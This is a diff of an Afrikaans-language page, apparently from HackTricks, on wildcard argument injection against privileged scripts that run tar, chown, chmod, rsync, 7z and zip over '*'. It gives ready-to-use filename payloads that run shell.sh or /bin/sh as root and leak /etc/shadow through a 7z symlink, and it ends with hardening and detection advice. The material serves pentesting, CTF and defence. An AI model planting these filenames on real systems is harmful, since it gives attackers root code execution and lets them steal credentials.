@@ -1,60 +1,123 @@
+# Wildcards Spare Tricks
+
 {{#include ../../banners/hacktricks-training.md}}
 
-## chown, chmod
+> Wildcard (ook bekend as *glob*) **argumentinjekie** gebeur wanneer 'n bevoorregte skrif 'n Unix-binary soos `tar`, `chown`, `rsync`, `zip`, `7z`, … met 'n ongekwote wildcard soos `*` uitvoer. 
+> Aangesien die shell die wildcard **voor** die uitvoering van die binary uitbrei, kan 'n aanvaller wat lêers in die werksgids kan skep, lêername saamstel wat met `-` begin sodat dit as **opsies in plaas van data** geïnterpreteer word, wat effektief arbitrêre vlae of selfs opdragte smokkel. 
+> Hierdie bladsy versamel die nuttigste primitiewe, onlangse navorsing en moderne opsporings vir 2023-2025.
 
-Jy kan **aandui watter lêer eienaar en regte jy wil kopieer vir die res van die lêers**
+## chown / chmod
+
+Jy kan **die eienaar/groep of die toestemmingsbits van 'n arbitrêre lêer kopieer** deur die `--reference` vlag te misbruik:
 ```bash
-touch "--reference=/my/own/path/filename"
+# attacker-controlled directory
+touch "--reference=/root/secret``file"   # ← filename becomes an argument
 ```
-U kan dit benut deur [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(gecombineerde aanval)_\
-Meer inligting in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
-
-## Tar
-
-**Voer arbitrêre opdragte uit:**
+Wanneer root later iets soos uitvoer:
 ```bash
+chown -R alice:alice *.php
+chmod -R 644 *.php
+```
+`--reference=/root/secret``file` word ingesluit, wat veroorsaak dat *alle* ooreenstemmende lêers die eienaarskap/permitte van `/root/secret``file` erf.
+
+*PoC & hulpmiddel*: [`wildpwn`](https://github.com/localh0t/wildpwn) (gecombineerde aanval).
+Sien ook die klassieke DefenseCode papier vir besonderhede.
+
+---
+
+## tar
+
+### GNU tar (Linux, *BSD, busybox-full)
+
+Voer arbitrêre opdragte uit deur die **checkpoint** kenmerk te misbruik:
+```bash
+# attacker-controlled directory
+echo 'echo pwned > /tmp/pwn' > shell.sh
+chmod +x shell.sh
 touch "--checkpoint=1"
 touch "--checkpoint-action=exec=sh shell.sh"
 ```
-U kan dit benut deur [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar aanval)_\
-Meer inligting in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+Sodra root `tar -czf /root/backup.tgz *` uitvoer, word `shell.sh` as root uitgevoer.
 
-## Rsync
+### bsdtar / macOS 14+
 
-**Voer arbitrêre opdragte uit:**
+Die standaard `tar` op onlangse macOS (gebaseer op `libarchive`) implementeer *nie* `--checkpoint` nie, maar jy kan steeds kode-uitvoering bereik met die **--use-compress-program** vlag wat jou toelaat om 'n eksterne kompressor te spesifiseer.
 ```bash
-Interesting rsync option from manual:
-
--e, --rsh=COMMAND           specify the remote shell to use
---rsync-path=PROGRAM    specify the rsync to run on remote machine
+# macOS example
+touch "--use-compress-program=/bin/sh"
 ```
+Wanneer 'n bevoorregte skrif `tar -cf backup.tar *` uitvoer, sal `/bin/sh` begin.
 
+---
+
+## rsync
+
+`rsync` laat jou toe om die afstandshell of selfs die afstandsbinary te oorskry via opdraglynvlaggies wat met `-e` of `--rsync-path` begin:
 ```bash
-touch "-e sh shell.sh"
+# attacker-controlled directory
+touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
 ```
-U kan dit benut deur [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_aanval)_\
-Meer inligting in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+As root later argiveer die gids met `rsync -az * backup:/srv/`, die ingeslote vlag laat jou shell op die afstand kant ontstaan.
 
-## 7z
+*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` modus).
 
-In **7z** kan jy selfs `--` voor `*` gebruik (let daarop dat `--` beteken dat die volgende invoer nie as parameters behandel kan word nie, so net lêerpaaie in hierdie geval) jy kan 'n arbitrêre fout veroorsaak om 'n lêer te lees, so as 'n opdrag soos die volgende deur root uitgevoer word:
+---
+
+## 7-Zip / 7z / 7za
+
+Selfs wanneer die bevoorregte skrip *defensief* die wildcard met `--` voorafgaan (om opsie-parsing te stop), ondersteun die 7-Zip formaat **lêerlys lêers** deur die lêernaam met `@` vooraf te gaan. Om dit te kombineer met 'n symlink laat jou toe om *arbitraire lêers te exfiltreer*:
 ```bash
-7za a /backup/$filename.zip -t7z -snl -p$pass -- *
+# directory writable by low-priv user
+cd /path/controlled
+ln -s /etc/shadow   root.txt      # file we want to read
+touch @root.txt                  # tells 7z to use root.txt as file list
 ```
-En jy kan lêers in die gids skep waar dit uitgevoer word, jy kan die lêer `@root.txt` en die lêer `root.txt` skep wat 'n **symlink** na die lêer is wat jy wil lees:
+As die root iets soos uitvoer:
 ```bash
-cd /path/to/7z/acting/folder
-touch @root.txt
-ln -s /file/you/want/to/read root.txt
+7za a /backup/`date +%F`.7z -t7z -snl -- *
 ```
-Dan, wanneer **7z** uitgevoer word, sal dit `root.txt` behandel as 'n lêer wat die lys van lêers bevat wat dit moet saamgepers (dit is wat die bestaan van `@root.txt` aandui) en wanneer 7z `root.txt` lees, sal dit `/file/you/want/to/read` lees en **aangesien die inhoud van hierdie lêer nie 'n lys van lêers is nie, sal dit 'n fout gooi** wat die inhoud toon.
+7-Zip sal probeer om `root.txt` (→ `/etc/shadow`) as 'n lêerlys te lees en sal uitval, **die inhoud na stderr druk**.
 
-_Meer in Write-ups van die boks CTF van HackTheBox._
+---
 
-## Zip
+## zip
 
-**Voer arbitrêre opdragte uit:**
+`zip` ondersteun die vlag `--unzip-command` wat *woordeliks* aan die stelselshell oorgedra word wanneer die argief getoets sal word:
 ```bash
-zip name.zip files -T --unzip-command "sh -c whoami"
+zip result.zip files -T --unzip-command "sh -c id"
 ```
+Inject die vlag via 'n vervaardigde lêernaam en wag vir die bevoorregte rugsteun-skrip om `zip -T` (toets argief) op die resultaat lêer aan te roep.
+
+---
+
+## Bykomende binaire wat kwesbaar is vir wildcard-inspuiting (2023-2025 vinnige lys)
+
+Die volgende opdragte is in moderne CTFs en werklike omgewings misbruik. Die payload word altyd geskep as 'n *lêernaam* binne 'n skryfbare gids wat later met 'n wildcard verwerk sal word:
+
+| Binaire | Vlag om te misbruik | Effek |
+| --- | --- | --- |
+| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrêre `@file` | Lees lêerinhoud |
+| `flock` | `-c <cmd>` | Voer opdrag uit |
+| `git`   | `-c core.sshCommand=<cmd>` | Opdrag uitvoering via git oor SSH |
+| `scp`   | `-S <cmd>` | Begin arbitrêre program in plaas van ssh |
+
+Hierdie primitiewe is minder algemeen as die *tar/rsync/zip* klassiekers, maar dit is die moeite werd om te kyk wanneer jy jag.
+
+---
+
+## Opsporing & Versterking
+
+1. **Deaktiveer shell globbing** in kritieke skripte: `set -f` (`set -o noglob`) voorkom wildcard uitbreiding.
+2. **Aanhaal of ontsnap** argumente: `tar -czf "$dst" -- *` is *nie* veilig nie — verkies `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
+3. **Expliciete paaie**: Gebruik `/var/www/html/*.log` in plaas van `*` sodat aanvallers nie susterlêers kan skep wat met `-` begin nie.
+4. **Minste voorreg**: Voer rugsteun/onderhoud take uit as 'n nie-bevoorregte diensrekening in plaas van root wanneer moontlik.
+5. **Monitering**: Elastic se voorafgeboude reël *Potensiële Shell via Wildcard-inspuiting* soek na `tar --checkpoint=*`, `rsync -e*`, of `zip --unzip-command` onmiddellik gevolg deur 'n shell-kind proses. Die EQL-navraag kan aangepas word vir ander EDRs.
+
+---
+
+## Verwysings
+
+* Elastic Security – Potensiële Shell via Wildcard-inspuiting Gedetecteerde reël (laas opgedateer 2025)
+* Rutger Flohil – “macOS — Tar wildcard-inspuiting” (18 Des 2024)
+
 {{#include ../../banners/hacktricks-training.md}}
